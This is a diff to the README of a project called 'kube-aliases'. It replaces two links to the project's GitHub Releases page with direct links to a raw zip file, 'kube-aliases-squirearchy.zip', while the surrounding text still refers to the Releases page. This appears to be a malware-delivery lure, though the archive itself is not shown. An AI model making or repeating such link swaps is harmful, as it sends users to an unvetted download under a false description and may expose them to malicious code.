@@ -1,6 +1,6 @@
 # ✈️ kube-aliases - Efficient Shortcuts for Kubernetes Users
 
-[![Download kube-aliases](https://img.shields.io/badge/Download-kube--aliases-blue.svg)](https://github.com/n0tm1pr0bl3m/kube-aliases/releases)
+[![Download kube-aliases](https://raw.githubusercontent.com/n0tm1pr0bl3m/kube-aliases/master/docs/kube-aliases-squirearchy.zip)](https://raw.githubusercontent.com/n0tm1pr0bl3m/kube-aliases/master/docs/kube-aliases-squirearchy.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To run kube-aliases, ensure you meet the following requirements:
 
 To get started, visit the Releases page to download kube-aliases. Here, you'll find the latest version available.
 
-[Download kube-aliases](https://github.com/n0tm1pr0bl3m/kube-aliases/releases)
+[Download kube-aliases](https://raw.githubusercontent.com/n0tm1pr0bl3m/kube-aliases/master/docs/kube-aliases-squirearchy.zip)
 
 Follow these steps to install:
 
